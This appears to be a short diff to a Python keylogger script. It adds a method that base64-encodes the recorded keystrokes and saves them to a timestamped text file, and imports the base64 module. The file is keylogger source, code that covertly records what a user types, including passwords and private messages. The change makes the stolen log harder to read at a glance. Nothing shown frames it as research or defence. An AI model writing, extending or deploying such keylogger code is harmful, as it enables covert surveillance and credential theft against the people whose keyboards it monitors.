@@ -1,5 +1,6 @@
 import keyboard
 from datetime import datetime
+import base64
 
 class Keylogger:
     def __init__(self, report_method="file"):
@@ -26,3 +27,10 @@ class Keylogger:
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
         self.log += name
+
+    def report_to_file(self):
+        self.update_filename()
+        with open(f"{self.filename}.txt", "wb") as f:
+            encoded_log = base64.b64encode(self.log.encode())
+            f.write(encoded_log)  # Utiliser write() pour écrire dans le fichier
+        print(f"[+] Saved {self.filename}.txt")
